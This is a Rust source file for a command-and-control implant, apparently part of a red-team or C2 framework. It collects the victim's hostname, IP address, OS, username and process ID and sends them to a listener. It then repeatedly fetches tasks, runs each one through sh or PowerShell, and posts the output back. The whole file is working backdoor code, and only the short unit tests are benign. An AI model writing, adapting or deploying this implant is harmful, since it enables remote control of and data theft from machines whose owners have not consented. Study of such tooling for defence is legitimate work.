use clap::Parser;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::error::Error;
use std::{
    net::UdpSocket,
    process::Command,
    time::{Duration, SystemTime},
};
use tokio::time::sleep;
use uuid::Uuid;
use whoami;

use rb::message::{CheckinResponse, CommandOutput, ImplantCheckin};
use rb::task::{Task, TaskResult, TaskStatus};

/// CLI arguments for the implant
#[derive(Parser, Debug, Clone)]
pub struct Args {
    /// C2 listener host (default: localhost)
    #[clap(long, default_value = "localhost")]
    pub host: String,

    /// C2 listener port (default: 8080)
    #[clap(short, long, default_value = "8080")]
    pub port: u16,

    /// Poll interval in seconds (default: 5)
    #[clap(long, default_value = "5")]
    pub interval: u64,
}

/// Main entrypoint for the implant logic.
pub async fn run_implant() -> Result<(), Box<dyn Error>> {
    let args = Args::parse();
    run_implant_with_args(args).await
}

/// Runs the implant with explicitly provided arguments
/// This allows the payload to hardcode values without CLI parsing
pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
    // Build base URL
    let base_url = format!("http://{}:{}", args.host, args.port);

    // Create HTTP client
    let client = Client::new();

    // Derive local IP by opening a UDP socket
    let ip_address = match get_local_ip(&args.host, args.port) {
        Ok(ip) => ip,
        Err(_) => "unknown".to_string(), // Fallback if IP resolution fails
    };

    // Prepare and send the check-in payload
    let checkin = ImplantCheckin {
        id: None,
        hostname: whoami::fallible::hostname().unwrap_or_default(),
        ip_address,
        os_info: whoami::distro(),
        username: whoami::username(),
        process_id: std::process::id(),
    };

    let resp = client
        .post(&format!("{}/checkin", base_url))
        .json(&checkin)
        .send()
        .await?;

    if !resp.status().is_success() {
        let status = resp.status();
        let body = resp.text().await.unwrap_or_default();
        return Err(format!("Check-in failed ({}): {}", status, body).into());
    }
    let data: CheckinResponse = resp.json().await?;
    let implant_id = data.implant_id;
    println!("Checked in. Implant ID: {}", implant_id);

    // Poll-execute-report loop
    loop {
        // Fetch tasks for this implant
        let tasks_resp = match client
            .get(&format!("{}/tasks/{}", base_url, implant_id))
            .send()
            .await
        {
            Ok(resp) => resp,
            Err(e) => {
                eprintln!("Failed to fetch tasks: {}", e);
                sleep(Duration::from_secs(args.interval)).await;
                continue;
            }
        };

        let tasks: Vec<Task> = tasks_resp.json().await.unwrap_or_else(|_| {
            eprintln!("Failed to parse tasks response");
            Vec::new()
        });

        for task in tasks {
            println!("Executing command: {}", task.command);
            let now = SystemTime::now();

            // Build the full script string so arguments land inside the command rather than as
            // flags on the shell itself.
            let full_command = build_command_string(&task.command, &task.args);

            // Shell out the command (use powershell on Windows)
            let result = if cfg!(target_os = "windows") {
                Command::new("powershell")
                    .args(["-NoProfile", "-Command", &full_command])
                    .output()
            } else {
                Command::new("sh").args(["-c", &full_command]).output()
            };

            let task_result = match result {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                    let combined_output = format!("{}{}", stdout, stderr);

                    TaskResult {
                        task_id: task.id,
                        implant_id,
                        session_id: task.session_id,
                        output: CommandOutput::Text(combined_output),
                        status: TaskStatus::Completed,
                        status_code: output.status.code(),
                        completed_at: now,
                        error: None, // No error for successful execution
                    }
                }
                Err(e) => {
                    let error_msg = format!("Failed to spawn command: {}", e);

                    TaskResult {
                        task_id: task.id,
                        implant_id,
                        session_id: task.session_id,
                        output: CommandOutput::None,
                        status: TaskStatus::Failed,
                        status_code: None,
                        completed_at: now,
                        error: Some(error_msg),
                    }
                }
            };

            // Post the result back
            if let Err(e) = client
                .post(&format!("{}/results", base_url))
                .json(&task_result)
                .send()
                .await
            {
                eprintln!("Failed to submit results: {}", e);
            }
        }

        // Wait before the next poll
        sleep(Duration::from_secs(args.interval)).await;
    }
}

fn get_local_ip(target_host: &str, target_port: u16) -> Result<String, Box<dyn Error>> {
    let socket = UdpSocket::bind("0.0.0.0:0")?;
    socket.connect((target_host, target_port))?;
    Ok(socket.local_addr()?.ip().to_string())
}

/// Join a command and its arguments into a single shell script string.
pub fn build_command_string(command: &str, args: &[String]) -> String {
    if args.is_empty() {
        command.to_string()
    } else {
        format!("{} {}", command, args.join(" "))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn build_command_string_without_args() {
        assert_eq!(build_command_string("whoami", &[]), "whoami");
    }

    #[test]
    fn build_command_string_with_args() {
        let args = vec!["hello".to_string(), "world".to_string()];
        assert_eq!(build_command_string("echo", &args), "echo hello world");
    }
}
